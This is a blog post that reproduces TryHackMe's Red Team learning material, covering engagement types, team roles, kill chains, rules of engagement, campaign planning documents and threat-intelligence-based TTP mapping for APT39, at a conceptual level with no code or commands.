---
title: "Red Team"
date: 2024-02-15
draft: false
summary: "Credit to TryHackMe"
tags: [THM, AD]
categories: [Red Team, TryHackMe]
---

# Introudction
[TryHackMe](https://tryhackme.com/signup?referrer=6325877cfcc474005111479e) provides one of the best contents when it comes to cybersecurity, below is a snippet of the content one will acquire when subcribed to the premium learning path of TryHackMe Red Team.
They have summarised the content very well and clealry understood, for practical experience, subscribe to their platform to gain the skills.

# RED TEAM


## **FUNDAMENTALS**

# **Vulnerability Assessment and Penetration Tests Limitations**

Vulnerability Assessments

This is the simplest form of security assessment, and its main 
objective is to identify as many vulnerabilities in as many systems in 
the network as possible. To this end, concessions may be made to meet 
this goal effectively. For example, the attacker's machine may be 
allowlisted on the available security solutions to avoid interfering 
with the vulnerability discovery process. This makes sense since the 
objective is to look at every host on the network and evaluate its 
security posture individually while providing the most information to 
the company about where to focus its remediation efforts.

To summarize, a vulnerability assessment focuses on scanning hosts 
for vulnerabilities as individual entities so that security deficiencies
 can be **identified** and effective security measures can be deployed to **protect**
 the network in a prioritized manner. Most of the work can be done with 
automated tools and performed by operators without requiring much 
technical knowledge.

As an example, if you were to run a 
vulnerability assessment over a network, you would normally try to scan 
as many of the hosts as possible, but wouldn't actually try exploiting 
any vulnerabilities at all:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ee93fb3de94655a02ae7a6b69676944b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ee93fb3de94655a02ae7a6b69676944b.png)

### Penetration Tests

On top of scanning every single host for vulnerabilities, we often 
need to understand how they impact our network as a whole. Penetration 
tests add to vulnerability assessments by allowing the pentester to 
explore the impact of an attacker on the overall network by doing 
additional steps that include:

- Attempt to **exploit** the vulnerabilities found on each system. This is important as sometimes a
vulnerability might exist in a system, but compensatory controls in
place effectively prevent its exploitation. It also allows us to test if we can use the detected vulnerabilities to compromise a given host.
- Conduct **post-exploitation** tasks on any compromised host, allowing us to find if we can extract any
helpful information from them or if we might use them to pivot to other
hosts that were not previously accessible from where we stand.

Penetration tests might start by scanning for vulnerabilities just as
 a regular vulnerability assessment but provide further information on 
how an attacker can chain vulnerabilities to achieve specific goals. 
While its focus remains on **identifying** vulnerabilities and establishing measures to **protect**
 the network, it also considers the network as a whole ecosystem and how
 an attacker could profit from interactions between its components.

If
 we were to perform a penetration test using the same example network as
 before, on top of scanning all of the hosts on the network for 
vulnerabilities we would try confirm if they can be exploited in order 
to show the impact an attacker could have on the network:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/da055515377a73c12f0dcef197c1ac8c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/da055515377a73c12f0dcef197c1ac8c.png)

By
 analyzing how an attacker could move around our network, we also gain a
 basic insight on possible security measure bypasses and our ability to **detect** a
 real threat actor to a certain extent, limited because the scope of a 
penetration test is usually extensive and Penetration testers don't care
 much about being loud or generating lots of alerts on security devices 
since time constraints on such projects often requires us to check the 
network in a short time.

### Advanced Persistent Threats and why Regular Pentesting is not Enough

While the conventional security engagements we have mentioned cover 
the finding of most technical vulnerabilities, there are limitations on 
such processes and the extent to which they can effectively prepare a 
company against a real attacker. Such limitations include:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f9c16ff60c1412eefd77f12253643bab.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f9c16ff60c1412eefd77f12253643bab.png)

As a consequence, some aspects of penetration tests might significantly differ from a real attack, like:

- **Penetration tests are LOUD:** Usually, pentesters
won't put much effort into trying to go undetected. Unlike real
attackers, they don't mind being easy to detect, as they have been
contracted to find as many vulnerabilities as they can in as many hosts
as possible.
- **Non-technical attack vectors might be overlooked:** Attacks based on social engineering or physical intrusions are usually not included in what is tested.
- **Relaxation of security mechanisms:** While doing a
regular penetration test, some security mechanisms might be temporarily
disabled or relaxed for the pentesting team in favor of efficiency.
Although this might sound counterintuitive, it is essential to remember
that pentesters have limited time to check the network. Therefore, it is usually desired not to waste their time searching for exotic ways to
bypass IDS/IPS, WAF, intrusion deception or other security measures, but rather focus on reviewing critical technological infrastructure for
vulnerabilities.

On
 the other hand, real attackers won't follow an ethical code and are 
mostly unrestricted in their actions. Nowadays, the most prominent 
threat actors are known as **Advanced Persistent Threats (APT)**,
 which are highly skilled groups of attackers, usually sponsored by 
nations or organised criminal groups. They primarily target critical 
infrastructure, financial organisations, and government institutions. 
They are called persistent because the operations of these groups can 
remain undetected on compromised networks for long periods.

If a company is affected by an APT,
 would it be prepared to respond effectively? Could they detect the 
methods used to gain and maintain access on their networks if the 
attacker has been there for several months? What if the initial access 
was obtained because John at accounting opened a suspicious email 
attachment? What if a zero-day exploit was involved? Do previous 
penetration tests prepare us for this?

**Red Team Engagements**

To
 keep up with the emerging threats, red team engagements were designed 
to shift the focus from regular penetration tests into a process that 
allows us to clearly see our defensive team's capabilities at **detecting** and **responding** to
 a real threat actor. They don't replace traditional penetration tests, 
but complement them by focusing on detection and response rather than 
prevention.

Red
 teaming is a term borrowed from the military. In military exercises, a 
group would take the role of a red team to simulate attack techniques to
 test the reaction capabilities of a defending team, generally known as **blue team**,
 against known adversary strategies. Translated into the world of 
cybersecurity, red team engagements consist of emulating a real threat 
actor's **Tactics, Techniques and Procedures (TTPs)** so that we can measure how well our blue team responds to them and ultimately improve any security controls in place.

Every red team engagement will start by defining clear goals, often referenced as **crown jewels** or **flags**,
 ranging from compromising a given critical host to stealing some 
sensitive information from the target. Usually, the blue team won't be 
informed of such exercises to avoid introducing any biases in their 
analysis. The red team will do everything they can to achieve the goals 
while remaining undetected and evading any existing security mechanisms 
like firewalls, antivirus, EDR,
 IPS and others. Notice how on a red team engagement, not all of the 
hosts on a network will be checked for vulnerabilities. A real attacker 
would only need to find a single path to its goal and is not interested 
in performing noisy scans that the blue team could detect.

Taking
 the same network as before, on a red team engagement where the goal is 
to compromise the intranet server, we would plan for a way to reach our 
objective while interacting as little as possible with other hosts. 
Meanwhile, the blue team's capacity to detect and respond accordingly to
 the attack can be evaluated:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e1f7ed550b706def50cb8df996caa8e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e1f7ed550b706def50cb8df996caa8e.png)

It is important to note that the final objective of such exercises 
should never be for the red team to "beat" the blue team, but rather 
simulate enough TTPs for the blue team to learn to react to a real 
ongoing threat adequately. If needed, they could tweak or add security 
controls that help to improve their detection capabilities.

Red team engagements also improve on regular penetration tests by considering several attack surfaces:

- **Technical Infrastructure:** Like in a regular
penetration test, a red team will try to uncover technical
vulnerabilities, with a much higher emphasis on stealth and evasion.
- **Social Engineering:** Targeting people through
phishing campaigns, phone calls or social media to trick them into
revealing information that should be private.
- **Physical Intrusion:** Using techniques like
lockpicking, RFID cloning, exploiting weaknesses in electronic access
control devices to access restricted areas of facilities.

Depending on the resources available, the red team exercise can be run in several ways:

- **Full Engagement:** Simulate an attacker's full workflow, from initial compromise until final goals have been achieved.
- **Assumed Breach:** Start by assuming the attacker has already gained control over some
assets, and try to achieve the goals from there. As an example, the red
team could receive access to some user's credentials or even a
workstation in the internal network.
- **Table-top Exercise:** An over the table simulation where scenarios are discussed between the
red and blue teams to evaluate how they would theoretically respond to
certain threats. Ideal for situations where doing live simulations might be complicated.

**Teams and Functions of an Engagement**

There are several 
factors and people involved within a red team engagement. Everyone will 
have their mindset and methodology to approach the engagement personnel;
 however, each engagement can be broken into three teams or cells. Below
 is a brief table illustrating each of the teams and a brief explanation
 of their responsibilities.

| Team | Definition |
| --- | --- |
| Red Cell | A red cell is the component that makes up 
the offensive portion of a red team engagement that simulates a given 
target's strategic and tactical responses. |
| Blue Cell | The blue cell is the opposite side of red. 
It includes all the components defending a target network. The blue cell
 is typically comprised of blue team members, defenders, internal staff,
 and an organisation's management. |
| White Cell | Serves as referee between red cell 
activities and blue cell responses during an engagement. Controls the 
engagement environment/network. Monitors adherence to the ROE.
 Coordinates activities required to achieve engagement goals. Correlates
 red cell activities with defensive actions. Ensures the engagement is 
conducted without bias to either side. |

Definitions are sourced from [redteam.guide](https://redteam.guide/docs/definitions).

These teams or cells can be broken down further into an engagement hierarchy.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b90aad9dcdf10846c71ade3cca3d2e37.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b90aad9dcdf10846c71ade3cca3d2e37.png)

Since this is a red team-oriented room, we will focus on the 
responsibilities of the red cell. Below is a table outlining the roles 
and responsibilities of members of the red team.

| Role | Purpose |
| --- | --- |
| Red Team Lead | Plans and organises engagements at a high level—delegates, assistant lead, and operators engagement assignments. |
| Red Team Assistant Lead | Assists the team lead in overseeing 
engagement operations and operators. Can also assist in writing 
engagement plans and documentation if needed. |
| Red Team Operator | Executes assignments delegated by team leads. Interpret and analyse engagement plans from team leads. |

As with most red team functions, each team and company 
will have its own structure and roles for each team member. The above 
table only acts as an example of the typical responsibilities of each 
role.

**Engagement Structure**

A core function of the 
red team is adversary emulation. While not mandatory, it is commonly 
used to assess what a real adversary would do in an environment using 
their tools and methodologies. The red team can use various cyber kill 
chains to summarize and assess the steps and procedures of an 
engagement.

The blue team commonly uses cyber kill chains to map behaviors and 
break down an adversaries movement. The red team can adapt this idea to 
map adversary TTPs (**T**actics, **T**echniques, and **P**rocedures) to components of an engagement.

Many regulation and standardization bodies have released their cyber 
kill chain. Each kill chain follows roughly the same structure, with 
some going more in-depth or defining objectives differently. Below is a 
small list of standard cyber kill chains.

- [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://unifiedkillchain.com/)
- [Varonis Cyber Kill Chain](https://www.varonis.com/blog/cyber-kill-chain/)
- [Active Directory Attack Cycle](https://github.com/infosecn1nja/AD-Attack-Defense)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

In this room, we will commonly reference the "Lockheed Martin Cyber 
Kill Chain." It is a more standardized kill chain than others and is 
very commonly used among red and blue teams.

The Lockheed Martin kill chain focuses on a perimeter or external 
breach. Unlike other kill chains, it does not provide an in-depth 
breakdown of internal movement. You can think of this kill chain as a 
summary of all behaviors and operations present.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33e4c2dc2ab851b11654ae61953a7df1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33e4c2dc2ab851b11654ae61953a7df1.png)

Components of the kill chain are broken down in the table below.

| Technique | Purpose | Examples |
| --- | --- | --- |
| Reconnaissance | Obtain information on the target | Harvesting emails, OSINT |
| Weaponization | Combine the objective with an exploit. Commonly results in a deliverable payload. | Exploit with backdoor, malicious office document |
| Delivery | How will the weaponized function be delivered to the target | Email, web, USB |
| Exploitation | Exploit the target's system to execute code | MS17-010, Zero-Logon, etc. |
| Installation | Install malware or other tooling | Mimikatz, Rubeus, etc. |
| Command & Control | Control the compromised asset from a remote central controller | Empire, Cobalt Strike, etc. |
| Actions on Objectives | Any end objectives: ransomware, data exfiltration, etc. | Conti, LockBit2.0, etc. |

## **ENGAGEMENTS**

**Defining Scope and Objectives**

Engagements can be very
 complex and bureaucratic. The key to a successful engagement is clearly
 defined client objectives or goals. Client objectives should be 
discussed between the client and red team to create a mutual 
understanding between both parties of what is expected and provided. Set
 objectives are the basis for the rest of the engagement documentation 
and planning.

Without clear and concrete objectives and expectations, you are 
preparing for a very unstructured and unplanned campaign. Objectives set
 the tone for the rest of the engagement.

When assessing a client's objectives and planning the engagement 
details, you will often need to decide how focused the assessment is.

Engagements can be categorized between a general internal/network 
penetration test or a focused adversary emulation. A focused adversary 
emulation will define a specific APT or group to emulate within an 
engagement. This will typically be determined based on groups that 
target the company's particular industries, i.e., finance institutions 
and [APT38](https://web.archive.org/web/20230325143301/https://content.fireeye.com/apt/rpt-apt38).
 An internal or network penetration test will follow a similar structure
 but will often be less focused and use more standard TTPs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ffcfbe35e5ac372dc7ccc01896b76f9e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ffcfbe35e5ac372dc7ccc01896b76f9e.png)

The specifics of the approach will depend on a case-by-case basis of the engagement defined by the client objectives.

Client objectives will also affect the engagement's general rules of engagement and scope.

These topics will be expanded upon in Task 6.

The client objectives only set a basic definition of the client's 
goals of the engagement. The specific engagement plans will expand upon 
the client objectives and determine the specifics of the engagement. 
Engagement plans will be covered later within this room.

---

The next keystone to a precise and transparent engagement is a 
well-defined scope. The scope of an engagement will vary by organization
 and what their infrastructure and posture look like. A client's scope 
will typically define what you *canno*t do or target; it can also include what you *can* do
 or target. While client objectives can be discussed and determined 
along with the providing team, a scope should only be set by the client.
 In some cases the red team may discuss a grievance of the scope if it 
affects an engagement. They should have a clear understanding of their 
network and the implications of an assessment. The specifics of the 
scope and the wording will always look different, below is an example of
 what verbiage may look like within a client's scope.

- No exfiltration of data.
- Production servers are off-limits.
- 10.0.3.8/18 is out of scope.
- 10.0.0.8/20 is in scope.
- System downtime is not permitted under any circumstances.
- Exfiltration of PII is prohibited.

---

When analyzing a client's objectives or scopes from a red team 
perspective, it is essential to understand the more profound meaning and
 implications. When analyzing, you should always have a dynamic 
understanding of how your team would approach the problems/objectives. 
If needed, you should write your engagement plans or start them from 
only a bare reading of the client objectives and scope.

**Rules of Engagement**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f7c19c693ebf483d85d893a9df346aec.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f7c19c693ebf483d85d893a9df346aec.png)

Rules of Engagement (RoE) are a legally binding outline of the client
 objectives and scope with further details of engagement expectations 
between both parties. This is the first "official" document in the 
engagement planning process and requires proper authorization between 
the client and the red team. This document often acts as the general 
contract between the two parties; an external contract or other NDAs (**N**on-**D**isclosure **A**greement) can also be used.

The format and wording of the RoE are critical since it is a legally binding contract and sets clear expectations.

Each RoE structure will be determined by the client and red team 
and can vary in content length and overall sections. Below is a brief 
table of standard sections you may see contained in the RoE.

| **Section Name** | **Section Details** |
| --- | --- |
| Executive Summary | Overarching summary of all contents and authorization within RoE document |
| Purpose | Defines why the RoE document is used |
| References | Any references used throughout the RoE document (HIPAA, ISO, etc.) |
| Scope | Statement of the agreement to restrictions and guidelines |
| Definitions | Definitions of technical terms used throughout the RoE document |
| Rules of Engagement and Support Agreement | Defines obligations of both parties and general technical expectations of engagement conduct |
| Provisions | Define exceptions and additional information from the Rules of Engagement |
| Requirements, Restrictions, and Authority | Define specific expectations of the red team cell |
| Ground Rules | Define limitations of the red team cell's interactions |
| Resolution of Issues/Points of Contact | Contains all essential personnel involved in an engagement |
| Authorization | Statement of authorization for the engagement |
| Approval | Signatures from both parties approving all subsections of the preceding document |
| Appendix | Any further information from preceding subsections |

When
 analyzing the document, it is important to remember that it is only a 
summary, and its purpose is to be a legal document. Future and more 
in-depth planning are required to expand upon the RoE and client 
objectives.

**Campaign Planning**

Prior to this task, we 
have primarily focused on engagement planning and documentation from the
 business perspective. Campaign planning uses the information acquired 
and planned from the client objectives and RoE and applies it to various
 plans and documents to identify how and what the red team will do.

Each internal red team will have its methodology and 
documentation for campaign planning. We will be showing one in-depth set
 of plans that allows for precise communication and detailed 
documentation. The campaign summary we will be using consists of four 
different plans varying in-depth and coverage adapted from military 
operations documents. Each plan can be found in the table below with a 
brief explanation.

| **Type of Plan** | **Explanation of Plan** | **Plan Contents** |
| --- | --- | --- |
| Engagement Plan | An overarching description of technical requirements of the red team. | CONOPS, Resource and Personnel Requirements, Timelines |
| Operations Plan | An expansion of the **Engagement Plan**. Goes further into specifics of each detail. | Operators, Known Information, Responsibilities, etc. |
| Mission Plan | The exact commands to run and execution time of the engagement. | Commands to run, Time Objectives, Responsible Operator, etc. |
| Remediation Plan | Defines how the engagement will proceed after the campaign is finished. | Report, Remediation consultation, etc. |

Another example of a campaign plan is the [redteam.guide](http://redteam.guide/) engagement checklist. The checklist, found [here](https://redteam.guide/docs/checklists/red-team-checklist/), acts as a more generalized approach to planning a campaign and information needed.

In the upcoming tasks, we will go further in-depth with these 
plans, documentation, and specifics of each as we take a deep dive into 
campaign planning.

**Engagement Documentation**

Engagement 
documentation is an extension of campaign planning where ideas and 
thoughts of campaign planning are officially documented. In this 
context, the term "document" can be deceiving as some plans do not 
require proper documentation and can be as simple as an email; this will
 be covered later in this task.

In this task, we will cover a technical overview of the contents of 
each campaign plan prior to looking at the plans and documents 
themselves in upcoming tasks.

**Engagement Plan:**

| **Component** | **Purpose** |
| --- | --- |
| CONOPS (**Con**cept of **Op**eration**s**) | Non-technically written overview of how the red team meets client objectives and target the client. |
| Resource plan | Includes
 timelines and information required for the red team to be 
successful—any resource requirements: personnel, hardware, cloud 
requirements. |

**Operations Plan:**

| **Component** | **Purpose** |
| --- | --- |
| Personnel | Information on employee requirements. |
| Stopping conditions | How and why should the red team stop during the engagement. |
| RoE (optional) | - |
| Technical requirements | What knowledge will the red team need to be successful. |

**Mission Plan:**

| **Component** | **Purpose** |
| --- | --- |
| Command playbooks (optional) | Exact
 commands and tools to run, including when, why, and how. Commonly seen 
in larger teams with many operators at varying skill levels. |
| Execution times | Times to begin stages of engagement. Can optionally include exact times to execute tools and commands. |
| Responsibilities/roles | Who does what, when. |

**Remediation Plan (optional):**

| Component | Purpose |
| --- | --- |
| Report | Summary of engagement details and report of findings. |
| Remediation/consultation | How
 will the client remediate findings? It can be included in the report or
 discussed in a meeting between the client and the red team. |

**Concept of Operations**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/967ddcdeb7f1739943706a2364c7ec51.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/967ddcdeb7f1739943706a2364c7ec51.png)

The
 Concept of Operation (CONOPS) is a part of the engagement plan that 
details a high-level overview of the proceedings of an engagement; we 
can compare this to an executive summary of a penetration test report. 
The document will serve as a business/client reference and a reference 
for the red cell to build off of and extend to further campaign plans.

The
 CONOPS document should be written from a semi-technical summary 
perspective, assuming the target audience/reader has zero to minimal 
technical knowledge. Although the CONOPS should be written at a high 
level, you should not omit details such as common tooling, target group,
 etc. As with most red team documents. There is not a set standard of a 
CONOPS document; below is an outline of critical components that should 
be included in a CONOPS

- Client Name
- Service Provider
- Timeframe
- General Objectives/Phases
- Other Training Objectives (Exfiltration)
- High-Level Tools/Techniques planned to be used
- Threat group to emulate (if any)

---

The key to writing and understanding a CONOPS is to provide just 
enough information to get a general understanding of all on-goings. The 
CONOPS should be easy to read and show clear definitions and points that
 readers can easily digest.

Answer the questions below

Read the example CONOPS and answer the questions below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b67e96f3e8ad1fe87a8f94ffbb092aad.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b67e96f3e8ad1fe87a8f94ffbb092aad.png)

Below is an example of the CONOPS for a mature organization with a strong security posture.

Example 1 - Holo Enterprises:

**CONOPS:**

Holo Enterprises has hired 
TryHackMe as an external contractor to conduct a month-long network 
infrastructure assessment and security posture. The campaign will 
utilize an assumed breach model starting in Tier 3 infrastructure. 
Operators will progressively conduct reconnaissance and attempt to meet 
objectives to be determined. If defined goals are not met, the red cell 
will move and escalate privileges within the network laterally. 
Operators are also expected to execute and maintain persistence to 
sustain for a period of three weeks. A trusted agent is expected to 
intervene if the red cell is identified or burned by the blue cell 
throughout the entirety of the engagement. The last engagement day is 
reserved for clean-up and remediation and consultation with the blue and
 white cell.

The customer has requested the following training 
objectives: assess the blue team's ability to identify and defend 
against live intrusions and attacks, Identify the risk of an adversary 
within the internal network. The red cell will accomplish objectives by 
employing the use of Cobalt Strike as the primary red cell tool. The red
 cell is permitted to use other standard tooling only identifiable to 
the targeted threat.

**Resource Plan**

The
 resource plan is the second document of the engagement plan, detailing a
 brief overview of dates, knowledge required (optional), resource 
requirements. The plan extends the CONOPS and includes specific details,
 such as dates, knowledge required, etc.

Unlike the CONOPS, the resource plan should not be written as a 
summary; instead, written as bulleted lists of subsections. As with most
 red team documents, there is no standard set of resource plan templates
 or documents; below is an outline of example subsections of the 
resource plan.

- Header
    - Personnel writing
    - Dates
    - Customer
- Engagement Dates
    - Reconnaissance Dates
    - Initial Compromise Dates
    - Post-Exploitation and Persistence Dates
    - Misc. Dates
- Knowledge Required (optional)
    - Reconnaissance
    - Initial Compromise
    - Post-Exploitation
- Resource Requirements
    - Personnel
    - Hardware
    - Cloud
    - Misc.

The key to writing and understanding a resource plan is to provide 
enough information to gather what is required but not become 
overbearing. The document should be straight to the point and define 
what is needed.

**Operations Plan**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/bb0f0f9fcc9d50faf20e45ead4f46bfe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/bb0f0f9fcc9d50faf20e45ead4f46bfe.png)

The
 operations plan is a flexible document(s) that provides specific 
details of the engagement and actions occurring. The plan expands upon 
the current CONOPS and should include a majority of specific engagement 
information; the ROE can also be placed here depending on the depth and 
structure of the ROE.

The operations plan should follow a similar 
writing scheme to the resource plan, using bulleted lists and small 
sub-sections. As with the other red team documents, there is no standard
 set of operation plan templates or documents; below is an outline of 
example subsections within the operations plan.

- Header
    - Personnel writing
    - Dates
    - Customer
- Halting/stopping conditions (can be placed in ROE depending on depth)
- Required/assigned personnel
- Specific TTPs and attacks planned
- Communications plan
- Rules of Engagement (optional)

The most notable addition to this document is the communications
 plan. The communications plan should summarize how the red cell will 
communicate with other cells and the client overall. Each team will have
 its preferred method to communicate with clients. Below is a list of 
possible options a team will choose to communicate.

- [vectr.io](http://vectr.io/)
- Email
- Slack

**Mission Plan**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/19b408dd3f5695259a809370697bd0eb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/19b408dd3f5695259a809370697bd0eb.png)

The
 mission plan is a cell-specific document that details the exact actions
 to be completed by operators. The document uses information from 
previous plans and assigns actions to them.

How the document is 
written and detailed will depend on the team; as this is an internally 
used document, the structure and detail have less impact. As with all 
the documents outlined in this room, presentation can vary; this plan 
can be as simple as emailing all operators. Below is a list of the 
minimum detail that cells should include within the plan.

- Objectives
- Operators
- Exploits/Attacks
- Targets (users/machines/objectives)
- Execution plan variations

The two plans can be thought of similarly; the operations plan 
should be considered from a business and client perspective, and the 
mission plan should be thought of from an operator and red cell 
perspective.

## **THREAT INTEL**

**What is Threat Intelligence**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/38ab08ed20de12af9690b3c6d1298cb3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/38ab08ed20de12af9690b3c6d1298cb3.png)

Expanding upon task 1, CTI can be consumed (to taken action upon data) by collecting IOCs (**I**ndicators **o**f **C**ompromise) and TTPs commonly distributed and maintained by [ISACs (**I**nformation and **S**haring **A**nalysis **C**enters)](https://tryhackme.com/room/introtoisac). Intelligence platforms and frameworks also aid in the consumption of CTI, primarily focusing on an overarching timeline of all activities.

*Note: The term ISAC is used loosely in the threat intelligence landscape and often refers to a threat intelligence platform.*

Traditionally,
 defenders use threat intelligence to provide context to the 
ever-changing threat landscape and quantify findings. IOCs are 
quantified by traces left by adversaries such as domains, IPs, files, 
strings, etc. The blue team can utilize various IOCs to build detections
 and analyze behavior. From a red team perspective, you can think of 
threat intelligence as the red team's analysis of the blue team's 
ability to properly leverage CTI for detections.

In this room, we will be focusing on APT (**A**dvanced **P**ersistent **T**hreat)
 activity and how to leverage their documented TTPs. The next task will 
detail the specifics of threat intelligence and its significance to the 
red team.

**Applying Threat Intel to the Red Team**

As previously mentioned, the red team will leverage CTI to aid in adversary emulation and support evidence of an adversary's behaviors.

To aid in consuming CTI and collecting TTPs, red teams will often use threat intelligence platforms and frameworks such as **MITRE ATT&CK**, **TIBER-EU**, and **OST Map**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/18b735abc9f5c1435864ab4a4f1b8848.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/18b735abc9f5c1435864ab4a4f1b8848.png)

These cyber frameworks will collect known TTPs and categorize them based on varying characteristics such as,

1. Threat Group
2. Kill Chain Phase
3. Tactic
4. Objective/Goal

Once a targeted adversary is selected, the goal is to identify all 
TTPs categorized with that chosen adversary and map them to a known 
cyber kill chain. This concept is covered further in the next task.

Leveraging
 TTPs is used as a planning technique rather than something a team will 
focus on during engagement execution. Depending on the size of the team,
 a CTI
 team or threat intelligence operator may be employed to gather TTPs for
 the red team. During the execution of an engagement, the red team will 
use threat intelligence to craft tooling, modify traffic and behavior, 
and emulate the targeted adversary. This concept is covered further in 
task 5.

Overall the red team consumes threat intelligence to analyze and 
emulate the behaviors of adversaries through collected TTPs and IOCs.

**The TIBER-EU Framework**

**TIBER-EU** (**T**hreat **I**ntelligence-**b**ased **E**thical **R**ed Teaming) is a common framework developed by the European Central Bank that centers around the use of threat intelligence.

From the [ECB TIBER-EU white paper](https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf),
 "The Framework for Threat Intelligence-based Ethical Red Teaming 
(TIBER-EU) enables European and national authorities to work with 
financial infrastructures and institutions (hereafter referred to 
collectively as 'entities') to put in place a programme to test and 
improve their resilience against sophisticated cyber attacks."

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/29c6b67582199ed69f1310348d29aa8c.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/29c6b67582199ed69f1310348d29aa8c.svg)

The main difference between this framework and others is the *"Testing"* phase that requires threat intelligence to feed the red team's testing.

This framework encompasses a best practice rather than anything actionable from a red team perspective.

There are several public white papers and documents if you are interested in reading about this framework further,

- [https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf](https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf)
- [https://www.crest-approved.org/membership/tiber-eu/](https://www.crest-approved.org/membership/tiber-eu/)

**TTP Mapping**

**TTP Mapping** is
 employed by the red cell to map adversaries' collected TTPs to a 
standard cyber kill chain. Mapping TTPs to a kill chain aids the red 
team in planning an engagement to emulate an adversary.

To begin the process of mapping TTPs, an adversary must be selected as the target. An adversary can be chosen based on,

1. Target Industry
2. Employed Attack Vectors
3. Country of Origin
4. Other Factors

As an example for this task, we have decided to use [**APT 39**](https://attack.mitre.org/groups/G0087/), a cyber-espionage group run by the Iranian ministry, known for targeting a wide variety of industries.

We will use the Lockheed Martin cyber kill chain as our standard cyber kill chain to map TTPs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f53c9707927cbfec71f813810387dd3c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f53c9707927cbfec71f813810387dd3c.png)

The first cyber framework we will be collecting TTPs from is [**MITRE ATT&CK**](https://attack.mitre.org/). If you are not familiar with MITRE
 ATT&CK, it provides IDs and descriptions of categorized TTPs. For 
more information about MITRE and how to use ATT&CK, check out the [MITRE room](https://tryhackme.com/room/mitre).

ATT&CK provides a basic summary of a group's collected TTPs. We can use [**ATT&CK Navigator**](https://mitre-attack.github.io/attack-navigator/) to help us visualize each TTP
 and categorize its place in the kill chain. Navigator visualizes the 
ATT&CK chain with the adversaries' designated TTPs highlighted under
 the corresponding sub-section.

To use the ATT&CK Navigator: navigate to the groups summary page, next to *"Techniques Used,"* navigate to *"ATT&CK Navigator Layers,"* from the dropdown navigate to *"view."* An ATT&CK Navigator layer should have opened with the selected group's TTPs highlighted in a new tab.

Going through the Navigator layer, we can assign various TTPs we 
want to employ during the engagement. Below is a compiled kill chain 
with mapped TTPs for **APT39**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ce9424c66a674856de4c97613cbde8c4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ce9424c66a674856de4c97613cbde8c4.png)

1. Reconnaissance:
    - No identified TTPs, use internal team methodology
2. Weaponization:
    - Command and Scripting Interpreter
        - PowerShell
        - Python
        - VBA
    - User executed malicious attachments
3. Delivery:
    - Exploit Public-Facing Applications
    - Spearphishing
4. Exploitation:
    - Registry modification
    - Scheduled tasks
    - Keylogging
    - Credential dumping
5. Installation:
    - Ingress tool transfer
    - Proxy usage
6. Command & Control:
    - Web protocols (HTTP/HTTPS)
    - DNS
7. Actions on Objectives
    - Exfiltration over C2

---

MITRE
 ATT&CK will do most of the work needed, but we can also supplement 
threat intelligence information with other platforms and frameworks. 
Another example of a TTP framework is [**OST Map**](https://www.intezer.com/ost-map/).

OST Map provides a visual map to link multiple threat actors and their TTPs.

